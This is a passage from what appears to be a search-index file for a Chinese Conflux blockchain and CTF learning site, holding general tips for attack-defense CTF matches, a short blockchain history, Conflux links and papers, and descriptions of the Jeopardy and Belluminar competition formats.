\u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u5e76\u672a\u516c\u5f00\u662f check \u54ea\u91cc\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002 \u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684 patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002 \u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002","title":"\u670d\u52a1 patch \u4e0e\u9632\u5fa1"},{"location":"introduction/experience/#_3","text":"\u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002","title":"\u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb"},{"location":"introduction/experience/#_4","text":"\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece \u7b80\u5355\u9898 \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002 \u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002 \u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002 \u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002","title":"\u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565"},{"location":"introduction/highlight-time/","text":"\u91cd\u8981\u65f6\u523b \u00b6 2021\u5e74\u5e74\u672b\uff0cConflux\u6240\u6295\u7a3f\u8bba\u6587\u88ab\u77e5\u540d\u56fd\u9645\u4f1a\u8baeICSE\u63a5\u6536\uff0c \u63a5\u6536\u4fe1\u606f","title":"\u91cd\u8981\u65f6\u523b"},{"location":"introduction/highlight-time/#_1","text":"2021\u5e74\u5e74\u672b\uff0cConflux\u6240\u6295\u7a3f\u8bba\u6587\u88ab\u77e5\u540d\u56fd\u9645\u4f1a\u8baeICSE\u63a5\u6536\uff0c \u63a5\u6536\u4fe1\u606f","title":"\u91cd\u8981\u65f6\u523b"},{"location":"introduction/history/","text":"\u533a\u5757\u94fe \u5386\u53f2 \u00b6 \u672c\u680f\u5185\u5bb9\u6458\u81ea\u767e\u5ea6\u767e\u79d1\u6bd4\u7279\u5e01\u548c\u4ee5\u592a\u574a\u8bcd\u6761\u3002 \u533a\u5757\u94fe \u7684\u8d77\u6e90 \u00b6 \u533a\u5757\u94fe\u7684\u8d77\u6e90\u662fSatoshi Nakamoto\u57282008\u5e74\u53d1\u5e03\u7684 \u300a\u6bd4\u7279\u5e01:\u4e00\u79cd\u70b9\u5bf9\u70b9\u7684\u7535\u5b50\u73b0\u91d1\u7cfb\u7edf\u300b \u8fd9\u4e00\u6587\u7ae0\uff0c\u5728\u6587\u4e2d\u9610\u8ff0\u4e86\u57fa\u4e8eP2P\u7f51\u7edc\u6280\u672f\u3001\u52a0\u5bc6\u6280\u672f\u3001\u65f6\u95f4\u6233\u6280\u672f\u3001\u533a\u5757\u94fe\u6280\u672f\u7b49\u7684\u7535\u5b50\u73b0\u91d1\u7cfb\u7edf\u7684\u6784\u67b6\u7406\u5ff5\u3002 \u533a\u5757\u94fe \u7279\u6027 \u00b6 \u53bb\u4e2d\u5fc3\u5316\uff1a\u5206\u5e03\u5f0f\u5b58\u50a8\u7684\uff0c\u6240\u4ee5\u4e0d\u5b58\u5728\u4e2d\u5fc3\u70b9\uff0c\u4ee5\u81f3\u4e8e\u65e0\u9700\u53ef\u4fe1\u7b2c\u4e09\u65b9\u63d0\u4f9b\u7cfb\u7edf \u5f00\u653e\u6027\uff1a\u533a\u5757\u94fe\u7684\u7cfb\u7edf\u6570\u636e\u662f\u516c\u5f00\u900f\u660e\u7684\uff0c\u4f8b\u5982\u5728Conflux\u7f51\u7edc\u4e2d\u53ef\u4ee5\u901a\u8fc7 ConfluxScan \u67e5\u770b\u6240\u6709\u533a\u5757\u6570\u636e \u81ea\u6cbb\u6027\uff1a\u533a\u5757\u94fe\u91c7\u7528\u57fa\u4e8e\u534f\u5546\u4e00\u81f4\u7684\u89c4\u8303\u548c\u534f\u8bae\uff0c\u5404\u8282\u70b9\u5c06\u4e25\u683c\u6309\u7167\u8fd9\u4e00\u89c4\u8303\u6216\u534f\u8bae\u6267\u884c \u4fe1\u606f\u4e0d\u53ef\u7be1\u6539\u6027\uff1a\u5f97\u76ca\u4e8e\u62a5\u6587\u6458\u8981\u51fd\u6570\u7684\u4f7f\u7528\uff0c\u5982\u679c\u4fe1\u606f\u5b58\u50a8\u5230\u533a\u5757\u94fe\u4e2d\u5c06\u88ab\u6c38\u4e45\u4fdd\u5b58\u4e14\u65e0\u6cd5\u88ab\u7be1\u6539\u3002 \u533f\u540d\u6027\uff1a\u5728\u533a\u5757\u94fe\u4e2d\u94b1\u5305\u5730\u5740\u65e0\u6cd5\u4f53\u73b0\u4e2a\u4eba\u7684\u4fe1\u606f\uff0c\u4f46\u5173\u4e8e\u533a\u5757\u94fe\u80fd\u5426\u8fbe\u5230100%\u7684\u533f\u540d\u6027\uff0c\u4ecd\u7136\u5b58\u5728\u4e89\u8bae\u3002 \u300c\u76f8\u5bf9\u66f4\u6613\u7528\u7684\u300d\u533a\u5757\u94fe \u00b6 \u4ee5\u592a\u574a\uff08\u82f1\u6587Ethereum\uff09\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u6709\u667a\u80fd\u5408\u7ea6\u529f\u80fd\u7684\u516c\u5171\u533a\u5757\u94fe\u5e73\u53f0\uff0c\u901a\u8fc7\u5176\u4e13\u7528\u52a0\u5bc6\u8d27\u5e01\u4ee5\u592a\u5e01\uff08Ether\uff0c\u7b80\u79f0ETH\uff09\u63d0\u4f9b\u53bb\u4e2d\u5fc3\u5316\u7684\u4ee5\u592a\u865a\u62df\u673a\uff08Ethereum Virtual Machine\uff09\u6765\u5904\u7406\u70b9\u5bf9\u70b9\u5408\u7ea6\u3002 \u4ee5\u592a\u574a\u7684\u8bbe\u8ba1\u9075\u5faa\u4e86\u5982\u4e0b\u539f\u5219\uff1a \u7b80\u6d01\u539f\u5219\uff1a\u534f\u8bae\u5c3d\u53ef\u80fd\u88ab\u8bbe\u8ba1\u7684\u8db3\u591f\u7b80\u5355\uff0c\u4fbf\u4e8e\u7a0b\u5e8f\u5458\u8fdb\u884c\u5f00\u53d1\u4e0e\u5efa\u8bbe \u901a\u7528\u539f\u5219\uff1a\u4ee5\u592a\u574a\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5185\u90e8\u7684\u56fe\u7075\u5b8c\u5907\u7684\u811a\u672c\u8bed\u8a00\u4ee5\u4f9b\u7528\u6237\u6765\u6784\u5efa\u4efb\u4f55\u53ef\u4ee5\u7cbe\u786e\u5b9a\u4e49\u7684\u667a\u80fd\u5408\u7ea6\u6216\u4ea4\u6613\u7c7b\u578b \u6a21\u5757\u5316\u539f\u5219\uff1a\u4e0d\u540c\u529f\u80fd\u5c3d\u53ef\u80fd\u6a21\u5757\u5316\u4e14\u53ef\u5206 \u65e0\u6b67\u89c6\u539f\u5219\uff1a\u4e0d\u8bd5\u56fe\u53cd\u5bf9\u7279\u5b9a\u7684\u4e0d\u53d7\u6b22\u8fce\u7684\u5e94\u7528","title":"\u533a\u5757\u94fe \u5386\u53f2"},{"location":"introduction/history/#_1","text":"\u672c\u680f\u5185\u5bb9\u6458\u81ea\u767e\u5ea6\u767e\u79d1\u6bd4\u7279\u5e01\u548c\u4ee5\u592a\u574a\u8bcd\u6761\u3002","title":"\u533a\u5757\u94fe \u5386\u53f2"},{"location":"introduction/history/#_2","text":"\u533a\u5757\u94fe\u7684\u8d77\u6e90\u662fSatoshi Nakamoto\u57282008\u5e74\u53d1\u5e03\u7684 \u300a\u6bd4\u7279\u5e01:\u4e00\u79cd\u70b9\u5bf9\u70b9\u7684\u7535\u5b50\u73b0\u91d1\u7cfb\u7edf\u300b \u8fd9\u4e00\u6587\u7ae0\uff0c\u5728\u6587\u4e2d\u9610\u8ff0\u4e86\u57fa\u4e8eP2P\u7f51\u7edc\u6280\u672f\u3001\u52a0\u5bc6\u6280\u672f\u3001\u65f6\u95f4\u6233\u6280\u672f\u3001\u533a\u5757\u94fe\u6280\u672f\u7b49\u7684\u7535\u5b50\u73b0\u91d1\u7cfb\u7edf\u7684\u6784\u67b6\u7406\u5ff5\u3002","title":"\u533a\u5757\u94fe \u7684\u8d77\u6e90"},{"location":"introduction/history/#_3","text":"\u53bb\u4e2d\u5fc3\u5316\uff1a\u5206\u5e03\u5f0f\u5b58\u50a8\u7684\uff0c\u6240\u4ee5\u4e0d\u5b58\u5728\u4e2d\u5fc3\u70b9\uff0c\u4ee5\u81f3\u4e8e\u65e0\u9700\u53ef\u4fe1\u7b2c\u4e09\u65b9\u63d0\u4f9b\u7cfb\u7edf \u5f00\u653e\u6027\uff1a\u533a\u5757\u94fe\u7684\u7cfb\u7edf\u6570\u636e\u662f\u516c\u5f00\u900f\u660e\u7684\uff0c\u4f8b\u5982\u5728Conflux\u7f51\u7edc\u4e2d\u53ef\u4ee5\u901a\u8fc7 ConfluxScan \u67e5\u770b\u6240\u6709\u533a\u5757\u6570\u636e \u81ea\u6cbb\u6027\uff1a\u533a\u5757\u94fe\u91c7\u7528\u57fa\u4e8e\u534f\u5546\u4e00\u81f4\u7684\u89c4\u8303\u548c\u534f\u8bae\uff0c\u5404\u8282\u70b9\u5c06\u4e25\u683c\u6309\u7167\u8fd9\u4e00\u89c4\u8303\u6216\u534f\u8bae\u6267\u884c \u4fe1\u606f\u4e0d\u53ef\u7be1\u6539\u6027\uff1a\u5f97\u76ca\u4e8e\u62a5\u6587\u6458\u8981\u51fd\u6570\u7684\u4f7f\u7528\uff0c\u5982\u679c\u4fe1\u606f\u5b58\u50a8\u5230\u533a\u5757\u94fe\u4e2d\u5c06\u88ab\u6c38\u4e45\u4fdd\u5b58\u4e14\u65e0\u6cd5\u88ab\u7be1\u6539\u3002 \u533f\u540d\u6027\uff1a\u5728\u533a\u5757\u94fe\u4e2d\u94b1\u5305\u5730\u5740\u65e0\u6cd5\u4f53\u73b0\u4e2a\u4eba\u7684\u4fe1\u606f\uff0c\u4f46\u5173\u4e8e\u533a\u5757\u94fe\u80fd\u5426\u8fbe\u5230100%\u7684\u533f\u540d\u6027\uff0c\u4ecd\u7136\u5b58\u5728\u4e89\u8bae\u3002","title":"\u533a\u5757\u94fe \u7279\u6027"},{"location":"introduction/history/#_4","text":"\u4ee5\u592a\u574a\uff08\u82f1\u6587Ethereum\uff09\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u6709\u667a\u80fd\u5408\u7ea6\u529f\u80fd\u7684\u516c\u5171\u533a\u5757\u94fe\u5e73\u53f0\uff0c\u901a\u8fc7\u5176\u4e13\u7528\u52a0\u5bc6\u8d27\u5e01\u4ee5\u592a\u5e01\uff08Ether\uff0c\u7b80\u79f0ETH\uff09\u63d0\u4f9b\u53bb\u4e2d\u5fc3\u5316\u7684\u4ee5\u592a\u865a\u62df\u673a\uff08Ethereum Virtual Machine\uff09\u6765\u5904\u7406\u70b9\u5bf9\u70b9\u5408\u7ea6\u3002 \u4ee5\u592a\u574a\u7684\u8bbe\u8ba1\u9075\u5faa\u4e86\u5982\u4e0b\u539f\u5219\uff1a \u7b80\u6d01\u539f\u5219\uff1a\u534f\u8bae\u5c3d\u53ef\u80fd\u88ab\u8bbe\u8ba1\u7684\u8db3\u591f\u7b80\u5355\uff0c\u4fbf\u4e8e\u7a0b\u5e8f\u5458\u8fdb\u884c\u5f00\u53d1\u4e0e\u5efa\u8bbe \u901a\u7528\u539f\u5219\uff1a\u4ee5\u592a\u574a\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5185\u90e8\u7684\u56fe\u7075\u5b8c\u5907\u7684\u811a\u672c\u8bed\u8a00\u4ee5\u4f9b\u7528\u6237\u6765\u6784\u5efa\u4efb\u4f55\u53ef\u4ee5\u7cbe\u786e\u5b9a\u4e49\u7684\u667a\u80fd\u5408\u7ea6\u6216\u4ea4\u6613\u7c7b\u578b \u6a21\u5757\u5316\u539f\u5219\uff1a\u4e0d\u540c\u529f\u80fd\u5c3d\u53ef\u80fd\u6a21\u5757\u5316\u4e14\u53ef\u5206 \u65e0\u6b67\u89c6\u539f\u5219\uff1a\u4e0d\u8bd5\u56fe\u53cd\u5bf9\u7279\u5b9a\u7684\u4e0d\u53d7\u6b22\u8fce\u7684\u5e94\u7528","title":"\u300c\u76f8\u5bf9\u66f4\u6613\u7528\u7684\u300d\u533a\u5757\u94fe"},{"location":"introduction/link/","text":"Conflux\u76f8\u5173\u94fe\u63a5 \u00b6 \u5b98\u65b9\u7f51\u7ad9 \u00b6 \u5b98\u7f51 \uff1a\u4f18\u79c0 \u82f1\u6587\u7248\u767d\u76ae\u4e66 \uff1a\u7ecf\u6d4e\u6a21\u578b \u5b98\u65b9\u8bba\u575b \uff1a\u5404\u7c7b\u4ea4\u6d41\u677f\u5757\uff0c\u95ee\u7b54\u4ea4\u6d41\uff0c\u6837\u6837\u90fd\u884c \u533a\u5757\u6d4f\u89c8\u5668 \uff1a\u7528\u6765\u770b\u533a\u5757\uff0c\u4ea4\u6613\uff0c\u7f51\u7edc\u60c5\u51b5\u7edf\u8ba1\u4fe1\u606f\uff0c\u94b1\u5305\u4fe1\u606f\uff0c\u7f51\u7edc\u5df2\u652f\u6301\u4ee3\u5e01\u4fe1\u606f\u7b49 \u63d2\u4ef6\u94b1\u5305 \uff1a\u7c7bMetamask\u6d4f\u89c8\u5668\u63d2\u4ef6\u94b1\u5305\uff08\u6211\u77e5\u9053\u4f60\u60f3\u8981\u4ec0\u4e48\uff0c \u5b89\u88c5\u6559\u7a0b \uff0c\u6709\uff01\uff09 \u5f00\u6e90\u4ed3\u5e93 \u00b6 Offical Github UI\u5f00\u6e90\u5e93 \u5f00\u53d1\u57fa\u7840 \u00b6 \u5f00\u53d1\u73af\u5883\u914d\u7f6e\u53ca\u6848\u4f8b \u82f1\u6587\u7248Conflux\u534f\u8bae\u89c4\u8303\uff08\u9ec4\u76ae\u4e66\uff09 \u82f1\u6587\u7248\u5f00\u53d1\u6307\u5357 \u5e38\u89c1\u6280\u672f\u95ee\u9898\u6307\u5357Github\u4ed3\u5e93 \u8bba\u6587\u6210\u679c \u00b6 A Decentralized Blockchain with High Throughput and Fast Confirmation GHAST: Breaking Confirmation Delay Barrier in Nakamoto Consensus via Adaptive Weighted Blocks","title":"Conflux\u76f8\u5173\u94fe\u63a5"},{"location":"introduction/link/#conflux","text":"","title":"Conflux\u76f8\u5173\u94fe\u63a5"},{"location":"introduction/link/#_1","text":"\u5b98\u7f51 \uff1a\u4f18\u79c0 \u82f1\u6587\u7248\u767d\u76ae\u4e66 \uff1a\u7ecf\u6d4e\u6a21\u578b \u5b98\u65b9\u8bba\u575b \uff1a\u5404\u7c7b\u4ea4\u6d41\u677f\u5757\uff0c\u95ee\u7b54\u4ea4\u6d41\uff0c\u6837\u6837\u90fd\u884c \u533a\u5757\u6d4f\u89c8\u5668 \uff1a\u7528\u6765\u770b\u533a\u5757\uff0c\u4ea4\u6613\uff0c\u7f51\u7edc\u60c5\u51b5\u7edf\u8ba1\u4fe1\u606f\uff0c\u94b1\u5305\u4fe1\u606f\uff0c\u7f51\u7edc\u5df2\u652f\u6301\u4ee3\u5e01\u4fe1\u606f\u7b49 \u63d2\u4ef6\u94b1\u5305 \uff1a\u7c7bMetamask\u6d4f\u89c8\u5668\u63d2\u4ef6\u94b1\u5305\uff08\u6211\u77e5\u9053\u4f60\u60f3\u8981\u4ec0\u4e48\uff0c \u5b89\u88c5\u6559\u7a0b \uff0c\u6709\uff01\uff09","title":"\u5b98\u65b9\u7f51\u7ad9"},{"location":"introduction/link/#_2","text":"Offical Github UI\u5f00\u6e90\u5e93","title":"\u5f00\u6e90\u4ed3\u5e93"},{"location":"introduction/link/#_3","text":"\u5f00\u53d1\u73af\u5883\u914d\u7f6e\u53ca\u6848\u4f8b \u82f1\u6587\u7248Conflux\u534f\u8bae\u89c4\u8303\uff08\u9ec4\u76ae\u4e66\uff09 \u82f1\u6587\u7248\u5f00\u53d1\u6307\u5357 \u5e38\u89c1\u6280\u672f\u95ee\u9898\u6307\u5357Github\u4ed3\u5e93","title":"\u5f00\u53d1\u57fa\u7840"},{"location":"introduction/link/#_4","text":"A Decentralized Blockchain with High Throughput and Fast Confirmation GHAST: Breaking Confirmation Delay Barrier in Nakamoto Consensus via Adaptive Weighted Blocks","title":"\u8bba\u6587\u6210\u679c"},{"location":"introduction/mode/","text":"CTF \u7ade\u8d5b\u6a21\u5f0f\u7b80\u4ecb \u00b6 \u89e3\u9898\u6a21\u5f0f - Jeopardy \u00b6 \u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u7c7b\u4f3c\u4e8e ACM \u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u6797\u5339\u514b\u8d5b\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u8fdb\u884c\u6392\u540d\u3002 \u4e0d\u540c\u7684\u662f\u8fd9\u4e2a\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e \u4e00\u8840 \u3001 \u4e8c\u8840 \u3001 \u4e09\u8840 \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002 \u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002 \u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b Web \u7f51\u7edc\u653b\u9632 \u3001 RE \u9006\u5411\u5de5\u7a0b \u3001 Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 \u3001 Crypto \u5bc6\u7801\u653b\u51fb \u3001 Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002 \u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar \u00b6 \u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u4e2d\u56fd\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016 \u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002 \u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a http://belluminar.org/ \u8d5b\u5236\u4ecb\u7ecd \u00b6 Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF & seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack. \u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u5206\u4eab\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\uff0c\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002 \u51fa\u9898\u9636\u6bb5 \u00b6 \u6bcf\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u51fa\u4e24\u4e2aChallenge\u5230challenge\u9898\u5e93 \u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa 2 \u9053Challange\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907Challenge\u3002\u51faChallenge\u7684\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002 Challenge 1: must be on the Linux platform; Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...) \u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053Challenge\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2aChallenge\u5219\u4e3a\u975e Linux \u5e73\u53f0\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002 \u4e3a\u4f7f\u6bd4\u8d5bChallenge\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51faChallenge\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684Challenge\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a 200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002 \u63d0\u4ea4\u90e8\u7f72 